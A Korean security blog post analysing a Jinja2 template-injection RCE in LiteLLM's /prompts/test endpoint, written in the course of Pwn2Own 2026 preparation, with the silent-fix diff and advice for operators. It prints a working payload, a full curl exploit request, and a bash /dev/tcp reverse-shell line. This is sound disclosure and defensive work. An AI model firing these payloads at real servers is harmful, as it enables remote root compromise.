---
title: LiteLLM에서 발견한 Jinja2 SSTI 취약점 — Pwn2Own 2026 출전 시도와 silent fix 분석
categories: [Research, AI-Security]
tags: [AI, security, SSTI, LiteLLM, Pwn2Own, Jinja2, RCE]
date: 2026-05-03 22:00:00 +0900
---

안녕하세요! 오랜만에 글로 찾아왔어요. 오늘은 제가 `Pwn2Own Berlin 2026`에 출전하기 위해 분석하다가 발견한 [LiteLLM](https://github.com/BerriAI/litellm) 의 `Server-Side Template Injection(SSTI)` 취약점에 대해 풀어보려 합니다.

> **결론부터 말하면**: 이 취약점은 단일 HTTP 요청만으로 LiteLLM 프록시 서버에서 `uid=0(root)`을 받아내는 critical-grade RCE였어요. Pwn2Own 등록 후보로 ZDI에 제출 직전까지 갔지만, 대회 직전인 `2026-04-09`에 `BerriAI/litellm` 메인테이너가 [PR #25445](https://github.com/BerriAI/litellm/pull/25445)로 silent fix를 머지하면서 안타깝게도 출전이 무산되었어요. 그래도 발견된 취약점 자체와 그 패치 내용은 LLM 인프라를 운영하시는 분들께 도움이 될 것 같아 정리해서 공유합니다.

***

# 1. 배경: 왜 LiteLLM이 Pwn2Own 타겟이었나

[BerriAI/LiteLLM](https://github.com/BerriAI/litellm)은 `OpenAI`, `Anthropic`, `Azure OpenAI`, `Bedrock`, `Vertex AI` 등 수많은 LLM 제공자를 단일 OpenAI-compatible API로 묶어주는 오픈소스 게이트웨이 프록시에요. 사내에서 여러 모델을 표준화된 인터페이스로 쓰고 싶을 때 흔히 도입되는 인프라이고, [Pwn2Own Berlin 2026](https://www.zerodayinitiative.com/blog/2026/1/pwn2own-berlin-2026)의 `Local Inference` 카테고리에 $40,000 / 4 MoP 가치로 등재된 공식 타겟이기도 했어요.

대회 룰은 명확합니다. 

- 네트워크 경유로 contestant laptop → 타겟 머신에서 `arbitrary code execution`을 달성해야 하고
- 반드시 **default configuration**, **latest fully patched version** 에서 동작해야 해요. 

이런 조건이라면 자연스럽게 `litellm proxy`가 노출하는 HTTP 엔드포인트 중에서 `사용자 입력이 위험한 sink로 흘러가는 경로`를 찾는 게 1순위 작업이 됩니다.

***

# 2. 취약점 발생 포인트

## 2-1. 핵심 sink: `prompt_manager.py:62`

LiteLLM은 [Dotprompt](https://google.github.io/dotprompt/) 형식의 프롬프트 템플릿을 지원해요. 이를 처리하는 클래스가 `litellm/integrations/dotprompt/prompt_manager.py`의 `PromptManager` 인데, 여기서 Jinja2 환경을 다음과 같이 만들어 두고 있었어요. (v1.83.4 기준)

```python
# litellm/integrations/dotprompt/prompt_manager.py (v1.83.4)
from jinja2 import DictLoader, Environment, select_autoescape


class PromptManager:
    def __init__(self, prompt_directory=None, prompt_file=None):
        self.prompt_directory = Path(prompt_directory) if prompt_directory else None
        self.prompts: Dict[str, PromptTemplate] = {}
        self.prompt_file = prompt_file
        self.jinja_env = Environment(                                  # ← ⚠️ non-sandboxed
            loader=DictLoader({}),
            autoescape=select_autoescape(["html", "xml"]),
            # Use Handlebars-style delimiters to match Dotprompt spec
            ...
        )
```

문제가 보이시나요? `jinja2.Environment(...)`는 **샌드박스가 적용되지 않은 일반 환경**입니다. 이 환경에서 `template.render()` 가 호출되면 `__globals__`, `__class__`, `__init__`, `__mro__` 같은 Python 위험 속성에 자유롭게 접근할 수 있어요. 즉, `사용자가 임의로 작성한 템플릿 문자열`이 이 환경으로 렌더링된다면 `Jinja2 SSTI → Remote Code Execution` 으로 이어집니다.

> 📌 비교를 위해 같은 코드베이스의 다른 위치인 `litellm/llms/.../factory.py`를 보면 `ImmutableSandboxedEnvironment`를 사용하고 있어요. 즉 메인테이너 분도 sandbox의 필요성은 인지하고 있었는데, `prompt_manager.py`만 누락된 케이스였던 거죠.

## 2-2. 도달 경로: `POST /prompts/test`

이제 사용자 입력이 이 위험한 환경으로 흘러가는 경로를 찾아야 해요. LiteLLM proxy의 라우터에서 다음 엔드포인트를 발견했습니다.

```python
# litellm/proxy/prompts/prompt_endpoints.py (v1.83.4 기준 ~line 1258)
@router.post("/prompts/test", ...)
async def test_prompt(
    request: TestPromptRequest,
    user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth),
):
    ...
    # request.dotprompt_content 는 클라이언트가 보낸 임의 문자열
    parsed = parse_dotprompt(request.dotprompt_content)
    template_content = parsed["body"]
    rendered_content = prompt_manager.jinja_env.from_string(
        template_content
    ).render(**variables)
    ...
```

핵심은 두 가지에요:

1. `dotprompt_content`는 **클라이언트가 HTTP body로 보내는 임의 문자열**입니다. 화이트리스트, 길이 제한, 패턴 검증 어떤 것도 없어요. 
2. 이 문자열의 `body` 부분이 그대로 위에서 만들어진 non-sandboxed `jinja_env.from_string(...).render(...)` 로 렌더링됩니다.

인증은 `user_api_key_auth` 만 필요한데, 이게 또 흥미로운 부분이에요.

- `LITELLM_MASTER_KEY` **미설정 (default)**: 인증이 사실상 비활성화 → **Zero-auth RCE**
- `LITELLM_MASTER_KEY` 설정: `internal_user` role 의 일반 API key 만 있어도 통과 (별도 admin role 체크 없음)

즉, ZDI 대회 환경처럼 `master_key + internal_user API key` 가 contestant에게 제공되는 setup에서도 그대로 작동한다는 뜻이에요.

## 2-3. 페이로드와 검증

Jinja2 SSTI 의 클래식 페이로드 한 줄로 충분했어요.

```python
{{ lipsum.__globals__["__builtins__"]["__import__"]("os").popen("id").read() }}
```

실제로 공식 Docker 이미지로 띄운 LiteLLM proxy에 다음과 같이 요청을 보내봤어요. (master_key 설정된 ZDI 시나리오 기준)

```bash
curl -X POST http://victim:4000/prompts/test \
  -H "Authorization: Bearer sk-internal-user-key" \
  -H "Content-Type: application/json" \
  -d '{
    "dotprompt_content": "---\nmodel: gpt-4o\n---\n{{ lipsum.__globals__[\"__builtins__\"][\"__import__\"](\"os\").popen(\"id\").read() }}",
    "prompt_variables": {}
  }'
```

응답:

```json
{"detail":{"error":"...uid=0(root) gid=0(root) groups=0(root)\n..."}}
```

검증 환경:

| 날짜 | 버전 | 환경 | 결과 |
|------|------|------|------|
| 2026-03-23 | v1.82.6 | podman + python:3.11-slim | ✅ RCE (uid=0, default + master_key 양쪽) |
| 2026-04-08 | v1.83.4 | podman + python:3.11-slim | ✅ RCE 재확인 (blind + reverse shell 모두) |

`reverse shell` 도 손쉽게 연결되었습니다. (`bash -i >& /dev/tcp/<atk>/<port> 0>&1`을 popen 인자로 그대로 넣으면 됨)

***

# 3. 패치 분석 — silent fix 한 줄의 미학

이렇게 등록 직전까지 갔다가, 4월 9일에 **단 두 줄짜리** silent fix가 머지되었어요. 

- 커밋: [`d910a95661`](https://github.com/BerriAI/litellm/commit/d910a95661)
- PR: [BerriAI/litellm#25445](https://github.com/BerriAI/litellm/pull/25445)
- 메시지: `fix(proxy): improve input validation on management endpoints`
- 작성자/머지: `jaydns` ([Veria Labs](https://github.com/verialabs)) 가 작성, `yuneng-jiang` (BerriAI) 가 머지

핵심 변경은 다음과 같아요.

```diff
-from jinja2 import DictLoader, Environment, select_autoescape
+from jinja2 import DictLoader, select_autoescape
+from jinja2.sandbox import ImmutableSandboxedEnvironment


 class PromptManager:
     def __init__(self, ...):
         ...
-        self.jinja_env = Environment(
+        # Sandboxed env: templates can come from user input via /prompts/test,
+        # so we must block access to unsafe Python attributes and mutation of
+        # caller-supplied mutables.
+        self.jinja_env = ImmutableSandboxedEnvironment(
             loader=DictLoader({}),
             autoescape=select_autoescape(["html", "xml"]),
             ...
         )
```

**`Environment` → `ImmutableSandboxedEnvironment` 한 줄 교체**가 본질이고, 추가된 주석에 `"templates can come from user input via /prompts/test"` 라고 명시되어 있어 메인테이너가 위험을 명확히 인지하고 패치한 케이스에요.

## 3-1. 왜 이 패치로 충분한가

`ImmutableSandboxedEnvironment`는 Jinja2가 기본으로 제공하는 가장 엄격한 sandbox 환경이에요. 다음 동작이 자동으로 차단됩니다.

- 모든 `__` prefix 속성 접근 (`__class__`, `__globals__`, `__init__`, `__subclasses__`, `__mro__`, `__bases__` ...)
- mutable 객체의 메서드 호출 (`list.append`, `dict.update` 등)
- `getattr`, `mro`, `range` 등 위험 함수 호출

패치 후 같은 페이로드를 던지면 응답이 다음과 같이 바뀝니다.

```json
{"detail":"access to attribute '__globals__' of 'function' object is unsafe."}
```

`lipsum`, `cycler`, `namespace`, `''.__class__` 등 흔히 쓰이는 우회 페이로드 4종 모두 동일한 메시지로 거부됩니다.

## 3-2. CVE 발급은? 

CVE는 발급되지 않았고, changelog에서도 보안 영향이 명시되지 않은 silent fix예요. PR 본문에도 단순히 "input validation 개선" 정도로만 적혀 있고, 동일 PR에 묶인 `key_management_endpoints.py` SQL 파라미터화 같은 부수적인 보안 수정과 함께 한꺼번에 반영되었습니다. 

연구자(jaydns) 가 제보 → 메인테이너가 비공개로 fix를 머지 → 사용자에게는 별도 공지 없이 다음 릴리스에 포함된 형태에요. 보안 공급망 관점에서 보면 "**패치는 있지만 사용자가 패치 의도를 모를 수 있다**"는 전형적인 silent-fix 패턴이라 운영자 입장에서는 항상 신경써야 하는 케이스입니다.

***

# 4. 영향 받는 버전과 운영자 권고

## 4-1. 버전 매트릭스

| 버전 범위 | 상태 | 비고 |
|-----------|------|------|
| ≤ v1.83.4 | 🚨 **취약** | v1.82.3 / v1.82.6 / v1.83.4 직접 검증 완료 |
| v1.83.5 이상 | ✅ **패치 적용** | 2026-04-09 머지 직후 첫 릴리스 |
| v1.83.14 (검증 시점 latest) | ✅ **패치 정상 동작 재확인** | 4종 페이로드 모두 sandbox 차단 |

> ⚠️ 공식 Docker 이미지의 `main-stable` 태그가 한동안 v1.82.3 / v1.82.6 처럼 패치 이전 버전을 가리키고 있었어요. 단순히 `docker pull ... :main-stable` 로 따라가는 운영자라면 이미지 digest를 다시 확인하는 게 안전합니다.

## 4-2. 운영자 권고

1. **즉시 업데이트**: `pip install --upgrade "litellm[proxy]" >= 1.83.5`. self-hosted 환경에서 `/prompts/test` 가 인터넷에 노출되어 있다면 더더욱 우선순위가 높아요.
2. **공식 이미지 사용 중이라면** `ghcr.io/berriai/litellm:main-latest` 의 digest를 확인하고, 가능하면 명시적으로 `v1.83.14` 같은 태그로 고정하는 걸 추천드려요.
3. **Internal user role 만 있어도 RCE가 가능했던 케이스**임을 기억하시고, 만약 외부에 prompt management API를 일부 공개하고 있다면 패치 적용 후에도 `/prompts/test` 와 같이 user-supplied template 을 받는 엔드포인트는 별도 ACL 로 제한하시는 걸 권장해요.
4. **tcpdump / proxy log 점검**: 패치 이전 기간 동안 `dotprompt_content` 에 `__globals__`, `lipsum`, `cycler`, `__class__`, `__import__`, `popen` 같은 키워드가 포함된 요청이 있었는지 retroactive 하게 확인해보시는 것도 좋을 거예요.

***

# 5. 우리가 얻은 교훈

## 5-1. 사용자 입력이 닿는 Jinja2는 `ImmutableSandboxedEnvironment` 가 기본

평범하지만 기본기에요. `Environment` 는 신뢰할 수 있는 내부에서 만든 입력에만 사용하고, 사용자 측에서 조금이라도 조작 가능한 텍스트가 닿는 순간 `ImmutableSandboxedEnvironment` 로 시작해야 합니다. 같은 프로젝트 안에서도 sink 마다 환경이 다르게 쓰이고 있었다는 건, "다른 위치에서는 잘 처리했으니 여기도 안전하겠지" 라는 가정이 얼마나 위험한지 보여주는 사례라고 생각해요.

## 5-2. AI 인프라에서 발견되는 *고전 웹 취약점*

LLM 게이트웨이, 벡터 DB, 멀티모달 파이프라인처럼 빠르게 성장하는 AI 인프라에는 의외로 `SSTI`, `SQL injection`, `SSRF`, `unsafe deserialization` 같은 클래식 웹 취약점이 그대로 살아있는 경우가 많아요. AI 보안이라고 하면 prompt injection, jailbreak 같은 LLM-native 이슈만 떠올리기 쉽지만, **실제로 RCE / 권한 상승까지 가는 가장 빠른 경로는 기존 웹 보안 분야의 패턴**이에요. AI 시스템을 평가할 때는 OWASP Top 10 부터 다시 점검하시는 걸 추천드려요.

## 5-3. silent fix 와 supply chain 

이번 케이스는 **CVE도 없고, security advisory 도 없고, changelog 한 줄로 묻혀 있던 패치**가 실제로는 critical RCE 를 막는 fix 였어요. 운영자 입장에서는 "변경사항 별 거 없네" 하고 넘어가기 쉬워요. 하지만 공급망의 한 단계라도 패치가 늦어지면 그 사이 외부 노출되어 있던 인스턴스는 방어선이 비어 있는 셈입니다. 

오픈소스 의존성을 신뢰하는 시대일수록, **단순히 latest tag 를 끌어다 쓰는 것이 아니라 commit 기준 패치 인지 - 적용 - 검증의 사이클**을 가져가는 게 점점 더 중요해지는 것 같아요.

***

# 끝으로

이 취약점은 결국 Pwn2Own 출전으로 이어지진 못했지만, 분석 과정에서 LLM 게이트웨이 같은 새로운 인프라가 어떻게 클래식 웹 패턴에 그대로 노출되는지 다시 확인할 수 있는 좋은 케이스였어요. 패치를 작성하고 머지해주신 [@jaydns](https://github.com/jaydns)([Veria Labs](https://github.com/verialabs))와 [@yuneng-jiang](https://github.com/yuneng-jiang) (BerriAI) 두 분께 감사드립니다. 좋은 fix 는 늘 이렇게 짧고 정확하더라고요.

Pwn2Own Berlin 2026 까지는 이제 얼마 남지 않았어요. 다음 글에서는 같이 분석했던 다른 타겟들의 이야기도 풀어볼 수 있게 되면 좋겠네요. :)
